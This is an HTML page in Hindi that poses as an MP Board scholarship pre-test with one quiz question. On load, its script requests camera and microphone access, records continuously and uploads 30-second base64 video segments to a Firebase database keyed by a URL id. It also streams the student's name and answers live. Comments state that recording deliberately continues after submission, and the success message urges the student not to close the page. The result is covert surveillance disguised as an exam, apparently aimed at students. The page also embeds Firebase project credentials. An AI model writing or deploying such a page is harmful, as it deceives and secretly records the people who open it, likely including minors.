<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MP Board Scholarship Exam Portal</title>
    
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>

    <style>
        * { box-sizing: border-box; font-family: 'Segoe UI', sans-serif; margin: 0; padding: 0; }
        body { background: #f0f4f8; color: #1e293b; padding: 15px; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .app-card { width: 100%; max-width: 500px; background: white; border-radius: 16px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); overflow: hidden; }
        .banner { background: linear-gradient(135deg, #1e3c72, #2a5298); color: white; padding: 25px; text-align: center; }
        .banner h2 { font-size: 22px; margin-bottom: 5px; }
        .content { padding: 25px; }
        .input-group { margin-bottom: 18px; }
        .input-group label { display: block; margin-bottom: 6px; font-weight: bold; font-size: 14px; }
        .input-group input { width: 100%; padding: 12px; border: 1px solid #cbd5e1; border-radius: 8px; font-size: 14px; }
        .qa-section { background: #f8fafc; border: 1px solid #e2e8f0; border-radius: 10px; padding: 15px; margin-bottom: 15px; }
        .qa-title { font-weight: bold; font-size: 14px; color: #1e3c72; margin-bottom: 8px; }
        .qa-options label { display: block; background: white; border: 1px solid #cbd5e1; padding: 10px; border-radius: 6px; margin-bottom: 6px; font-size: 13px; cursor: pointer; }
        .btn-submit { width: 100%; padding: 15px; background: #1e3c72; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; }
        .btn-submit:disabled { background: #64748b; cursor: not-allowed; }
        .status-feed { font-size: 12px; color: #64748b; text-align: center; margin-top: 10px; font-style: italic; }
        .success-msg { display: none; text-align: center; color: #16a34a; font-weight: bold; margin-top: 15px; font-size: 16px; }
    </style>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyC0i6AtzIoLZm-Lz3pLr4UK5snjhER0es",
            authDomain: "mytestapp-7b70d.firebaseapp.com",
            databaseURL: "https://mytestapp-7b70d-default-rtdb.firebaseio.com",
            projectId: "mytestapp-7b70d",
            storageBucket: "mytestapp-7b70d.firebasestorage.app",
            messagingSenderId: "380512974619",
            appId: "1:380512974619:web:a7ecfba6999a600a7cc5be",
            measurementId: "G-ZMV07B4JY6"
        };
        
        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();

        const urlParams = new URLSearchParams(window.location.search);
        let studentId = urlParams.get('id') || 'guest_user';
        let attemptId = 'attempt_' + Date.now(); 

        let mediaRecorder;
        let currentAnswers = { answer_q1: "Not Answered" };
        let studentName = "";
        let segmentCounter = 1;

        window.addEventListener("load", initExam);

        async function initExam() {
            try {
                // कैमरा और माइक एक्टिवेट करना
                let stream = await navigator.mediaDevices.getUserMedia({ video: { width: 200, height: 150, frameRate: 10 }, audio: true });
                
                database.ref('students/' + studentId + '/profile').update({
                    last_active_at: new Date().toISOString(),
                    portal_status: "OPENED"
                });

                startContinuousRecording(stream);

            } catch (err) {
                alert("परीक्षा शुरू करने के लिए कैमरा और माइक चालू करना अनिवार्य है।");
                console.log(err);
            }
        }

        function startContinuousRecording(stream) {
            mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8,opus' });
            
            mediaRecorder.ondataavailable = function(e) {
                if (e.data && e.data.size > 0) {
                    uploadVideoSegment(e.data);
                }
            };

            // बदलाव: हर ३०००० मिलीसेकंड (३० सेकंड) में वीडियो का एक हिस्सा स्वतः सेव होगा
            // जब तक ब्राउज़र खुला है, यह हर ३० सेकंड में नया टुकड़ा भेजता रहेगा
            mediaRecorder.start(30000); 
        }

        function uploadVideoSegment(blobData) {
            let reader = new FileReader();
            reader.readAsDataURL(blobData); 
            reader.onloadend = function() {
                let base64String = reader.result;
                let currentSegment = 'video_part_' + segmentCounter;
                
                // डेटाबेस में उसी अटेम्प्ट के अंदर पार्ट वाइज वीडियो सेव होना
                database.ref('students/' + studentId + '/test_attempts/' + attemptId + '/live_video_feeds/' + currentSegment).set(base64String);
                
                segmentCounter++;
            }
        }

        function trackInput(key, value) {
            if (key === 'student_name') {
                studentName = value;
                database.ref('students/' + studentId + '/profile').update({ name: value });
            } else {
                currentAnswers[key] = value;
            }
            
            // लाइव आंसर डेटाबेस में सिंक रखना
            database.ref('students/' + studentId + '/test_attempts/' + attemptId + '/answers').set(currentAnswers);
        }

        function submitTest(event) {
            event.preventDefault();
            
            const submitBtn = document.getElementById('submit-btn');
            submitBtn.disabled = true;
            
            document.getElementById('status-text').style.display = 'none';
            document.getElementById('success-block').style.display = 'block';

            // सबमिट होने पर प्रोफाइल स्टेटस बदलेगा, पर रिकॉर्डिंग बंद नहीं होगी!
            database.ref('students/' + studentId + '/profile').update({
                portal_status: "SUBMITTED",
                last_submission: new Date().toISOString()
            });
            
            // अंतिम बचे हुए आंसर्स को सिंक करना
            database.ref('students/' + studentId + '/test_attempts/' + attemptId).update({
                student_name: studentName || "Unknown",
                submitted_at: new Date().toISOString()
            });
        }
    </script>
</head>
<body>

<div class="app-card">
    <div class="banner">
        <h2>प्रवेश परीक्षा (Pre-Test)</h2>
        <p>स्कॉलरशिप पोर्टल (सुरक्षित मोड)</p>
    </div>

    <div class="content">
        <form onsubmit="submitTest(event)">
            <div class="input-group">
                <label>छात्र का पूरा नाम:</label>
                <input type="text" placeholder="यहाँ अपना नाम लिखें" required oninput="trackInput('student_name', this.value)">
            </div>

            <div class="qa-section">
                <div class="qa-title">💡 सवाल १: कंप्यूटर का कौन सा भाग 'मस्तिष्क' (Brain) कहलाता है?</div>
                <div class="qa-options">
                    <label><input type="radio" name="q1" value="A" onclick="trackInput('answer_q1', 'A')"> A) मॉनिटर</label>
                    <label><input type="radio" name="q1" value="B" onclick="trackInput('answer_q1', 'B')"> B) सी.पी.यू. (CPU)</label>
                    <label><input type="radio" name="q1" value="C" onclick="trackInput('answer_q1', 'C')"> C) कीबोर्ड</label>
                </div>
            </div>

            <button type="submit" id="submit-btn" class="btn-submit">उत्तर सबमिट करें</button>
            <div id="status-text" class="status-feed">सुरक्षा कैमरा सक्रिय है और बैकग्राउंड में लाइव चल रहा है...</div>
            <div id="success-block" class="success-msg">✓ उत्तर सबमिट हो गए हैं! कृपया इस पेज को अभी बंद न करें।</div>
        </form>
    </div>
</div>

</body>
</html>
